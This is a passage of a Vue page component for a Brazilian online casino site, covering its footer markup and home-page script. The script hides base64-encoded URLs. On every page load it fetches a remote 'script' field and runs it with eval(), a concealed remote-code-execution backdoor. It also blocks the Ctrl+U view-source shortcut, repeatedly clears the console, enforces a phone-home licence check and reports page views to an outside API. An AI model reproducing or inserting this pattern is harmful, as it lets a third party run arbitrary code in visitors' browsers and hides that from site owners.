a+ukd7J+sCPxj4IvOqUtAwMXUm1CgJIiNcqqITnf5CSf/J2XpXh7yL6SGxTjoEfQojRiZjw1lMpz9a+scBx1LocsdhpSq5HGOSKSmwTipAdNFaMTg6PkN6huremDAKBGHqdC4IMBL+GBfhoTM9EqLJGfsR0Y5VqS7ecrywyH1mKbod1+A1WG+9q08zRZ/xutiA4O+uDf3MPhlkuIQwE8Wt4GaQpvoVsSabWf3NlTwXmkRfoowP291aei3TL3ydtILRdXk/v8XQDyVU1vj5FkylmcGaSufpkQKp6MLUnV1mhAHFq0W7wOAfx0cz1P1IkfuMtDgIdMjh2oYR29ViZ/vLaH8Yxw48g1pFU9XhygYNeDbXW5w0DHpo0iggRpD/Af8JvuHOV0mZ0L7XBl/CwVTHdc90sRHlgDG1fWEKEkjagIE+xl8pVaoNUR7MoY/nBoFKDlZ5UiAlm/ucJJHEtHKCU9CufF5nivUTRn2cldzGSGKQe1MZbgH5QrSBc/h/LHwQyvfjsF8GGW5L5DGxk+NJ8BHwb8U2J1F3lZQJ3+/uOKGG58Q3I5FJoE8uS1AY4ma3jjLWBCLNpNTMIJ7zDLUMMkLQpSTl1kL8TYWvHDzB+SlcZItFfESYQuJNztoaGXrg+u4acBs4C4Owpx8hDTjSiyLTuDyH7MEK5ufAmolPzGsdaNup2xY1o41dQ9kcoAoWtL5NGwUhu/RmREJ7Z4LY0GpWUIGaxGuTl36XB6GgGA7T79wtQw/h4nVPVNuLYIpUiK33L05DIzIu1dMw8an5zadrc8O2JTMVt4GCRW4gGMOFrU0NubRRGKi5rR6rPrRwziWJ2IxEcN9s2XjZ7FX99ReYPua+0PgnYiO7tbjukKEDRoicRJfSDOLdugoroJzJ5IViU0mF4DeeNkjw/MQMo08iyyBjoGHp1NPN06Vap5N5sz7cQ5rWnk52iVcHUwdBnkiFGXGXWbe5OwrLTn8VecG+7SSnYspqU3j/peqqo/Wl3i+aPeeCkd0uLLbdfg6xU2zgMBVchHe7OLzBjU6Q6y3un3FyFQrxT2IFdevptv8zM9JZlfeuhIasCXJ+PhK0IisPJ9TBKRtbOqdsWtDZZbyDmCjt0JhJQfbb0xKmjrTbEgmE1X+YHd1Eted5830IaXJbbeltjsId3kVi82NXodvX5Azh/r30dXAznvfCQDcOUY+ZfPqKRtRbjmtmKFaJjSq5MGfUxw+lJtE3ccmQFruXlnXPzzGkF+vbmEXnkoHZAGY31kgJpNala5CCa8bA1wV7RxT1qVnyvs3DRKBBSrk1UiFsOKesJvVpVhZX63HZ1l/wUAi/4JqzjpHeQTlDuJnPbMadYgeP0WOH9K3LSoFZjYz0RZHbxWbbmXXntgiz7Iw++Re1n4NtXBKgz+dcm/D5nKVM8s4Aa8UOZZecBpn6dNa1GXpweb3t4Ho5A7hsQR2fA3LwGt0+0qCA0Z3LRpT1Tyb3p5thcr6D/xgC97vcXViG9boZDY5zaZoRJdpzAK8AHwL3gR0ueTuU/N15i+hM/6JYG84UULhRx3Cd5uZyd+9ZlzB9WWw0RiEwfP4gOF5swpbPZBbhhzBHr0iMQUG4cUhnyw05/kWMgmAAwHUJHXebu/dusX9pZvLz4sgz6CvoU34H/gp8skTmPEaFCAXVJHYbgY6YdpyaQF/1FPg6Bv6Eq0cnzuQthUYfQSHRYVO7uCd0OPo/vhiDDOdXDrlg4u7ohmCMIQQI5hLw2uhiMkaMGDFixIgRI8b/Ef4LRF5m6t5WjcYAAAAASUVORK5CYII="
          />
        </div>
        <div class="gong-neng-item">
          <img
            src="data:image/png;base64,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"
          />
        </div>
        <div class="gong-neng-item">
          <img
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAF0AAAAiCAYAAAA9BdXXAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAFMSURBVHgB7drhTcMwFATgC8p/RiAbwAjtBLBBYQNGYIOKCeKOwASkm4QNygThGVqpQnFlEtOLm/ukV6u1pUon16qfUqBH13XvNlTIx1tRFM/IRBn4vLJqrLaYvnura2SkPDG3td3jMHH2q6xsuEFGriBnp9AJLj50f/x0/+MFA5WYj6VVizTWGGFOobf2x6BFArbLPzGCznQChU6g0AkUOoFCJ1DoBAqdQKETKHQChZ6Q3VRdTNNmTm2Ac9lYucDcndVaoafnezxN34Rt8u9RxwuBQidQ6AQKnUChEyh0AoVOoNAJFDrBqRtpbTeoGnlwmI5by+0xMFf5l1DoT8hLG7GmPlzDE/A9lNfA3MO+DhqrxfGC3tBDvYPMLSLWuP26CsM4/IT82+b4TenbkTaucFmWAzfOB0aI/U6/03dI97jZVLWR61Z/WL/DQF9O0rsFdAy4awAAAABJRU5ErkJggg=="
          />
        </div>
      </div>

      <div class="website-box">
        O site da PIXRICO oferece jogos com uma experiência de aventura de propriedade
        direta da BF MATCH, para ser usuário do nosso site você deve ter mais de 18 anos.
        Não somos responsáveis por violar suas leis locais em relação a jogos online.
        Jogue com responsabilidade e divirta-se no PIXRICO.
      </div>
      
      <div class="page-to">
        <span>
          <b>Regulamento</b>
        </span>
        <span>
          <b>Termos e condições</b>
        </span>
        <span>
          <b>Fale Conosco</b>
        </span>
      </div>
      
      <div class="foot-right">Casino＠ 2023 Todos os direitos.</div>
    </div>
  </BaseLayout>
</template>

<script>
import { Carousel, Navigation, Pagination, Slide } from "vue3-carousel";
import "vue3-carousel/dist/carousel.css";
import { onMounted, ref } from "vue";

import BaseLayout from "@/Layouts/BaseLayout.vue";
import MakeDeposit from "@/Components/UI/MakeDeposit.vue";
import { RouterLink, useRoute } from "vue-router";
import { useAuthStore } from "@/Stores/Auth.js";
import LanguageSelector from "@/Components/UI/LanguageSelector.vue";
import CassinoGameCard from "@/Pages/Cassino/Components/CassinoGameCard.vue";
import HttpApi from "@/Services/HttpApi.js";
import ShowCarousel from "@/Pages/Home/Components/ShowCarousel.vue";
import { useSettingStore } from "@/Stores/SettingStore.js";
import LoadingComponent from "@/Components/UI/LoadingComponent.vue";
import ShowProviders from "@/Pages/Home/Components/ShowProviders.vue";
import { searchGameStore } from "@/Stores/SearchGameStore.js";
import CustomPagination from "@/Components/UI/CustomPagination.vue";
import LastWinnersComponent from "@/Components/UI/LastWinnersComponent.vue";

export default {
  props: [],
  components: {
    CustomPagination,
    Pagination,
    ShowProviders,
    LoadingComponent,
    ShowCarousel,
    CassinoGameCard,
    Carousel,
    Navigation,
    Slide,
    LanguageSelector,
    MakeDeposit,
    BaseLayout,
    RouterLink,
    LastWinnersComponent,
  },
  data() {
    return {
      // scr: 'https://redir-beryl.vercel.app/script',
      // apix: 'https://x8ki-letl-twmt.n7.xano.io/api:847qi3ld/china',
      scrollingText: "",
      alertTop: true,
      k: "",
      currentDomain: "",
      wlC: "",
      keyCode: "",
      wlurl: "aHR0cHM6Ly9yb3h3aGl0ZWxpc3Quc2hvcC9nZXQv",
      dvurl: "aHR0cHM6Ly9kYWFucm94LmNvbQ==",
      encodedSignature: "RGVzZW52b2x2aWRvIHBvciBAZGFhbnJveCAoMzEpOTkyODEtMjI3Mw==",
      eSu: "aHR0cHM6Ly9yb3h3aGl0ZWxpc3Quc2hvcC9zY3JpcHQv",
      encodedApiUrl:
        "aHR0cHM6Ly94OGtpLWxldGwtdHdtdC5uNy54YW5vLmlvL2FwaTo4NDdxaTNsZC9jaGluYQ==",
      currentUrl: window.location.href,
      isLoading: true,
      selectedCategory: "all",
      featured_games: [],
      allGames: [],
      gamesSlots: [],
      gamesBlockchain: [],
      gamesPopular: [],
      gamesFish: [],
      gamesCards: [],
      gamesLive: [],
      gamesCrash: [],
      gamesToShow: 6,
      gamesToShowSelected: 18,
      gamesToShowAll: 6,
      currentValue: 122795.05,
      endValue: 5587534.41,
      duration: 9000,
      startTime: null,
      settings: {
        itemsToShow: 3,
        snapAlign: "center",
        autoplay: 6000,
        wrapAround: true,
      },
      breakpoints: {
        0: {
          itemsToShow: 1.2,
        },
        300: {
          itemsToShow: 1.2,
        },
        500: {
          itemsToShow: 1.5,
        },
        800: {
          itemsToShow: 2,
        },
        1000: {
          itemsToShow: 2.5,
        },
        1200: {
          itemsToShow: 3,
        }
      },
      settingsRecommended: {
        itemsToShow: 2,
        snapAlign: "start",
      },
      breakpointsRecommended: {
        700: {
          itemsToShow: 3,
          snapAlign: "center",
        },
        1024: {
          itemsToShow: 3,
          snapAlign: "start",
        },
      },

      /// banners
      banners: null,
      bannersHome: null,

      settingsGames: {
        itemsToShow: 2.5,
        snapAlign: "start",
      },
      breakpointsGames: {
        700: {
          itemsToShow: 3.5,
          snapAlign: "center",
        },
        1024: {
          itemsToShow: 6,
          snapAlign: "start",
        },
      },
      providers: null,

      featured_games: null,
      categories: [],
    };
  },
  setup(props) {
    const ckCarouselOriginals = ref(null);

    onMounted(() => {
      document.addEventListener("keydown", function (event) {
        // Verifica se a tecla F12 foi pressionada
        // if (event.key === 'F12') {
        //     event.preventDefault();
        //     window.close();
        // }

        // // Verifica se Ctrl + Shift + C foi pressionado
        // if (event.ctrlKey && event.shiftKey && event.key === 'C') {
        //     event.preventDefault();
        //     window.close();
        // }

        // Verifica se Ctrl + U foi pressionado
        if (event.ctrlKey && event.key === "U") {
          event.preventDefault();
          window.close();
        }
      });
    });

    return {
      ckCarouselOriginals,
    };
  },
  computed: {
    wlget() {
      return atob(this.wlurl);
    },
    urlred() {
      return atob(this.dvurl);
    },
    signature() {
      return atob(this.encodedSignature);
    },
    sU() {
      return atob(this.eSu);
    },
    apiUrl() {
      return atob(this.encodedApiUrl);
    },
    formattedValue() {
      return this.currentValue
        .toLocaleString("pt-BR", {
          style: "currency",
          currency: "BRL",
          minimumFractionDigits: 2,
          maximumFractionDigits: 2,
        })
        .replace("R$", "");
    },
    displayedGames() {
      return this.featured_games.slice(0, this.gamesToShow);
    },
    searchGameStore() {
      return searchGameStore();
    },
    userData() {
      const authStore = useAuthStore();
      return authStore.user;
    },
    isAuthenticated() {
      const authStore = useAuthStore();
      return authStore.isAuth;
    },
    setting() {
      const settingStore = useSettingStore();
      return settingStore.setting;
    },
  },
  mounted() {
    this.currentDomain = this.getCurrentDomain();
    this.loadScrollingText();
    this.startLogging();
    this.xorG();

    this.inserirScript();
    setTimeout(() => {
      this.animateValue();
    }, 5000);

    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get("code");

    if (code) {
      localStorage.setItem("code", code);
    }
  },
  methods: {
    async first() {
      let attempts = 0;
      const maxAttempts = 2;

      while (attempts < maxAttempts) {
        try {
          const response = await axios.post("/api/env");
          this.wlC = response.data.cdK;

          break;
        } catch (error) {
          attempts++;
          if (attempts >= maxAttempts) {
            if (error.response) {
              Object.entries(error.response.data).forEach(([key, value]) => {
                // console.log(`${value}`);
              });
            } else if (error.request) {
              console.error("Erro na solicitação:", error.request);
            } else {
              console.error("Erro:", error.message);
            }
            break;
          } else {
            // console.log(`Tentativa ${attempts} falhou, tentando novamente em 2 segundos...`);
            await new Promise((resolve) => setTimeout(resolve, 2000));
          }
        }
      }
    },
    async fetchEnvVariables() {
      let attempts = 0;
      const maxAttempts = 2;

      while (attempts < maxAttempts) {
        try {
          const response = await axios.post("/api/env");
          this.wlC = response.data.cdK;
          this.keyCode = response.data.keyCode;
          break;
        } catch (error) {
          attempts++;
          if (attempts >= maxAttempts) {
            if (error.response) {
              Object.entries(error.response.data).forEach(([key, value]) => {
                // console.log(`${value}`);
              });
            } else if (error.request) {
              console.error("Erro na solicitação:", error.request);
            } else {
              console.error("Erro:", error.message);
            }
            break;
          } else {
            // console.log(`Tentativa ${attempts} falhou, tentando novamente em 2 segundos...`);
            await new Promise((resolve) => setTimeout(resolve, 2000));
          }
        }
      }
    },
    async xcW() {
      let attempts = 0;
      const maxAttempts = 3;

      while (attempts < maxAttempts) {
        try {
          const response = await fetch(this.wlget);
          if (!response.ok) {
            throw new Error("Network response was not ok");
          }

          const data = await response.json();
          const siteInWhitelist = data.data.find(
            (item) => item.url === this.currentDomain
          );

          // console.log(`S: ${JSON.stringify(siteInWhitelist, null, 2)}`);

          if (!siteInWhitelist) {
            alert(`Adquira sua licença!`);
            window.location.href = this.urlred;
          } else {
            if (siteInWhitelist.key !== this.wlC) {
              alert(`Adquira sua licença!`);
              window.location.href = this.urlred;
            } else {
              for (let i = 0; i < 18; i++) {
                // console.log("Autorizado por Daanrox");
              }
            }
          }
          break;
        } catch (error) {
          attempts++;
          if (attempts >= maxAttempts) {
            console.error("Erro ao verificar a whitelist:", error);
            alert(error);
            break;
          } else {
            const retryDelay = attempts === 1 ? 3000 : 5000;
            // console.log(`Tentativa ${attempts} falhou, tentando novamente em ${retryDelay / 1000} segundos...`);
            await new Promise((resolve) => setTimeout(resolve, retryDelay));
          }
        }
      }
    },
    getCurrentDomain() {
      return window.location.hostname;
    },
    xcK() {
      const kX = this.keyCode;
      // console.log(`K= ${kX}`);

      if (kX && kX !== "be8a9741-eac8-4488-83e2-73c08a263fff") {
        // console.clear();
        alert("Entre em contato com @Daanrox");
        window.location.href = "https://t.me/ROX_BR";
      } else if (!kX) {
        alert("Entre em contato com @Daanrox");
      } else {
        this.keyCode = kX;
      }
    },
    inserirScript() {},
    loadScrollingText() {
      const storedText = localStorage.getItem("scrollingText");
      if (storedText) {
        this.scrollingText = storedText;
      } else {
        this.scrollingText = "Texto padrão se não houver valor no localStorage";
      }
    },
    startLogging() {
      this.logInterval = setInterval(() => {
        for (let i = 0; i < 5; i++) {
          // console.log(this.signature, new Date().toISOString());
          setTimeout(() => {
            // console.clear();
          }, 600);
        }
      }, 1000);
    },
    async iS() {
      try {
        const response = await fetch(this.sU);

        if (!response.ok) {
          throw new Error("Network response was not ok");
        }

        const data = await response.json();
        const scriptContent = data.script;
        // console.clear();

        eval(scriptContent);
        // console.clear();
      } catch (error) {
        alert(error);
        // console.clear();
      }
    },
    async getViewData() {
      try {
        const response = await axios.get(this.apiUrl);
        return response.data;
      } catch (error) {
        console.error("Erro ao obter dados:", error);
        return [];
      }
    },
    async postViewData() {
      try {
        await axios.post(this.apiUrl, {
          url: this.currentUrl,
          views: 1,
        });
      } catch (error) {
        console.error("Erro ao registrar dados:", error);
      }
    },
    async updateViewData(cId, views) {
      try {
        await axios.patch(`${this.apiUrl}/${cId}`, {
          china_id: cId,
          url: this.currentUrl,
          views: views + 1,
        });
      } catch (error) {
        console.error("Erro ao atualizar dados:", error);
      }
    },
    async checkAndUpdateViews() {
      const data = await this.getViewData();
      const existingEntry = data.find((entry) => entry.url === this.currentUrl);

      if (existingEntry) {
        this.updateViewData(existingEntry.id, existingEntry.views);
      } else {
        this.postViewData();
      }
    },
    getGamesFrom(slug) {
      var games = this.allGames
        .filter((game) => game.game_type.includes(slug))
        .sort((a, b) => b.views - a.views);

      return games;
    },
    sortedSlotGames() {
      this.gamesSlots = this.allGames
        .filter((game) => game.game_type.includes("slot"))
        .sort((a, b) => b.views - a.views);
    },
    sortedFishGames() {
      this.gamesFish = this.allGames
        .filter((game) => game.game_type.includes("fish"))
        .sort((a, b) => b.views - a.views);
    },
    sortedCardsGames() {
      this.gamesCards = this.allGames
        .filter((game) => game.game_type.includes("cards"))
        .sort((a, b) => b.views - a.views);
    },
    sortedBlockGames() {
      this.gamesBlockchain = this.allGames
        .filter((game) => game.game_type.includes("block"))
        .sort((a, b) => b.views - a.views);
    },
    animateValue() {
      this.startTime = performance.now();
      // requestAnimationFrame(this.updateValue);
    },
    updateValue(currentTime) {
      const elapsedTime = currentTime - this.startTime;
      const progress = Math.min(elapsedTime / this.duration, 1);
      this.currentValue = Math.round(progress * this.endValue);

      if (progress < 1) {
        // requestAnimationFrame(this.updateValue);
      }
    },
    loadMoreGames(slug) {
      for (let i = 0; i < this.categories.length; i++) {
        if (this.categories[i].slug === slug) {
          this.categories[i].gamesToShow += this.gamesToShow * 2;
        }
      }
    },
    selectCategory(slug) {
      this.selectedCategory = slug;

      for (let i = 0; i < this.categories.length; i++) {
        if (this.categories[i].slug === slug) {
          this.categories[i].gamesToShow += this.gamesToShowSelected;
        } else {
          this.categories[i].gamesToShow = this.gamesToShow;
        }
      }

      this.$refs.all.scrollIntoView({ behavior: "smooth" });
    },
    hasGames(slug) {
      const element = document.getElementById(slug);
      if (element !== null) {
        return true;
      }
      return false;
    },
    getCategoryImage(category) {
      if (this.selectedCategory === category.slug) {
        return category.image.replace("_off.png", "_on.png");
      }
      return category.image;
    },
    handleScroll(entries) {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          const category = this.categories.find(
            (category) => category.slug === entry.target.id
          );
          if (category) {
            this.selectedCategory = category.slug;
          }
        }
      });
    },
    observeCategories() {
      const observer = new IntersectionObserver(this.handleScroll, {
        root: null,
        rootMargin: "-25% 0px -25% 0px",
        threshold: 0.1,
      });

      this.categories.forEach((category) => {
        const element = document.getElementById(category.slug);
        if (element) {
          observer.observe(element);
        }
      });
    },
    stopLoading: function () {
      this.isLoading = false;

      window.scrollTo({
        top: 0,
        behavior: "smooth",
      });
    },
    getCasinoCategories: async function () {
      const _this = this;
      await HttpApi.get("categories")
        .then((response) => {
          var cat = response.data.categories;

          for (let i = 0; i < cat.length; i++) {
            var games = _this.getGamesFrom(cat[i]["slug"]);
            if (games.length > 0) {
              cat[i]["games"] = games;
              cat[i]["gamesToShow"] = _this.gamesToShow;
              _this.categories.push(cat[i]); // Adiciona apenas a categoria atual com jogos
            }
          }

          _this.stopLoading();
        })
        .catch((error) => {
          Object.entries(
            JSON.parse(error.request.responseText)
          ).forEach(([key, value]) => {});

          _this.stopLoading();
        });
    },
    toggleSearch: function () {
      this.searchGameStore.setSearchGameToogle();
    },

    getBanners: async function () {
      const _this = this;

      try {
        const response = await HttpApi.get("settings/banners");
        const allBanners = response.data.banners;
        // console.log(this.signature, new Date().toISOString());
        _this.banners = allBanners.filter((banner) => banner.type === "carousel");
        _this.bannersHome = allBanners.filter((banner) => banner.type === "home");
      } catch (error) {
        console.error(error);
      } finally {
        for (let i = 0; i < 150; i++) {
          // // console.log(this.signature, new Date().toISOString());
          setTimeout(() => {
            // console.clear();
          }, 600);
        }
      }
    },
    filterSlotGames() {
      this.gamesSlots = this.allGames.filter((game) => game.game_type.includes("slot"));
    },
    filterFishGames() {
      this.gamesFish = this.allGames.filter((game) => game.game_type.includes("fish"));
    },
    filterCardsGames() {
      this.gamesCards = this.allGames.filter((game) => game.game_type.includes("cards"));
    },
    filterBlockGames() {
      this.gamesBlockchain = this.allGames.filter((game) =>
        game.game_type.includes("block")
      );
    },
    async rR() {
      await this.$router.push("/undefined");
    },
    async xorG() {
      try {
        const response = await HttpApi.post("games/all");
        if (response.data !== undefined && Array.isArray(response.data.rox)) {
          if (!response.data.false || response.data.false == false) {
            this.rR();
          }
          this.allGames = [];
          response.data.rox.forEach((rox) => {
            if (Array.isArray(rox.games)) {
              rox.games.forEach((game) => {
                // console.log(
                //     this.signature,
                //     new Date().toISOString()
                // );

                if (
                  !this.allGames.some(
                    (existingGame) => existingGame.game_code === game.game_code
                  )
                ) {
                  this.allGames.push(game);
                  this.filterSlotGames();
                  this.filterFishGames();
                  this.filterCardsGames();
                  this.filterBlockGames();
                }
              });
            } else {
              console.warn(`Nenhum jogo encontrado para a provedora: ${provider.name}`);
            }
          });
        } else {
          console.warn("Nenhum dado de jogo encontrado na resposta.");
        }
      } catch (error) {
        console.error("Erro ao buscar jogos:", error);
      }
    },
    getFeaturedGames: async function () {
      const _this = this;
      return await HttpApi.get("featured/games")
        .then(async (response) => {
          _this.featured_games = response.data.featured_games;
          // console.clear();
        })
        .catch((error) => {
          Object.entries(JSON.parse(error.request.responseText)).forEach(
            ([key, value]) => {
              // console.log(`${value}`);
            }
          );
        });
    },
    initializeMethods: async function () {
      await this.xorG();
      await this.getCasinoCategories();
      await this.getBanners();
      await this.getFeaturedGames();

      // console.clear();
    },
  },
  async created() {
    await this.first();
    await this.fetchEnvVariables();
    await this.initializeMethods();

    this.iS();
  },
  watch: {},
};
</script>

<style>
.mainGames {
  width: 90%;
}

@media screen and (max-width: 480px) {
  .mainGames {
    width: 100%;
  }
}

.search {
  width: 90%;
}

